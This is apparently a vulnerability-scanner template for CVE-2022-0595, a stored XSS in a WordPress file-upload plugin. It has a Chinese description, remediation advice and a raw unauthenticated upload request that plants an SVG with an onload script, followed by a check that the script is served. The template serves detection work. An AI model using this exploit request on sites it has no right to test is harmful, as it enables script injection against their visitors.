id: CVE-2022-0595
info:
  name: Drag and Drop Multiple File Upload - Contact Form 7 < 1.3.6.3 - Unauthenticated
    Stored XSS
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Drag and Drop Multiple File Upload 跨站脚本漏洞
    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是WordPress开源的一个应用插件。

    WordPress plugin Drag and Drop Multiple File Upload 1.3.6.3 之前版本存在跨站脚本漏洞，该漏洞源于默认允许通过 dnd_codedropz_upload AJAX 操作上传 SVG 文件，这可能导致存储跨站点脚本问题。
  severity: medium
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de

    临时修复方案：
    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body_2, "alert(document.domain)")
    - status_code_2 == 200
  raw:
  - |
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161

    -----------------------------92633278134516118923780781161
    Content-Disposition: form-data; name="size_limit"

    10485760
    -----------------------------92633278134516118923780781161
    Content-Disposition: form-data; name="action"

    dnd_codedropz_upload
    -----------------------------92633278134516118923780781161
    Content-Disposition: form-data; name="type"

    click
    -----------------------------92633278134516118923780781161
    Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
    Content-Type: image/jpeg

    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
    -----------------------------92633278134516118923780781161--
  - |
    GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.svg HTTP/1.1
    Host: {{Hostname}}
  req-condition: true
